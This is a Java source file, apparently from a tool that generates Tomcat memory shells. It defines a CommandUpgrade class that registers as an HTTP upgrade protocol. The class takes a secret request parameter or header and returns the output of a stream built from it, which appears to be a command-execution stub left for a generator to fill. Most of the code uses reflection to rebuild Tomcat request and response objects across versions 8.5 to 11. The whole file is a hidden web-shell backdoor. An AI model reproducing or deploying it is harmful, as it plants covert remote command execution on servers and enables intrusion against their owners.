package com.reajason.javaweb.memshell.shelltool.command;

import org.apache.catalina.connector.Response;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.Request;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/12/6
 */
public class CommandUpgrade implements UpgradeProtocol {
    public static String paramName;

    @Override
    public boolean accept(Request req) {
        try {
            org.apache.catalina.connector.Request request = getRequest(req);
            Response response = request.getResponse();
            String p = request.getParameter(paramName);
            if (p == null || p.isEmpty()) {
                p = request.getHeader(paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                outputStream.flush();
                outputStream.close();
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return true;
    }

    /**
     * Upgrade 回调先于 CoyoteAdapter.service 执行。冷 processor 尚未绑定 Catalina
     * Request/Response，需要按 CoyoteAdapter 的方式补建并写回 note。
     */
    @SuppressWarnings("all")
    private org.apache.catalina.connector.Request getRequest(Request req) throws Exception {
        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
        if (request != null) {
            return request;
        }
        // Tomcat 8.5 起 coyote Request 的 hook 只有私有字段，没有 getHook()
        Object hook = getFieldValue(req, "hook");
        Object adapter = getFieldValue(hook, "adapter");
        Object connector = getFieldValue(adapter, "connector");
        Object coyoteResponse = req.getClass().getMethod("getResponse").invoke(req);

        Response response;
        try {
            // Tomcat 8.5 ~ 10.1：先构造再绑定 coyote 对象
            request = (org.apache.catalina.connector.Request) connector.getClass().getMethod("createRequest").invoke(connector);
            request.getClass().getMethod("setCoyoteRequest", Request.class).invoke(request, req);
            response = (Response) connector.getClass().getMethod("createResponse").invoke(connector);
            response.getClass()
                    .getMethod("setCoyoteResponse", Class.forName("org.apache.coyote.Response"))
                    .invoke(response, coyoteResponse);
        } catch (NoSuchMethodException e) {
            // Tomcat 11 起改为带参构造，connector 不再单独绑定 coyote 对象
            request = (org.apache.catalina.connector.Request) connector.getClass()
                    .getMethod("createRequest", Request.class).invoke(connector, req);
            response = (Response) connector.getClass()
                    .getMethod("createResponse", Class.forName("org.apache.coyote.Response")).invoke(connector, coyoteResponse);
        }
        request.getClass().getMethod("setResponse", response.getClass()).invoke(request, response);
        response.getClass().getMethod("setRequest", request.getClass()).invoke(response, request);
        // Tomcat 8.5 ~ 10.1 只在首次绑定 note 时设置查询串字符集
        Object parameters = req.getClass().getMethod("getParameters").invoke(req);
        Object uriCharset = connector.getClass().getMethod("getURICharset").invoke(connector);
        parameters.getClass()
                .getMethod("setQueryStringCharset", Class.forName("java.nio.charset.Charset"))
                .invoke(parameters, uriCharset);

        req.setNote(1, request);
        coyoteResponse.getClass().getMethod("setNote", int.class, Object.class).invoke(coyoteResponse, 1, response);
        return request;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @Override
    public String getHttpUpgradeName(boolean isSSLEnabled) {
        return "";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return "";
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
        return null;
    }
}
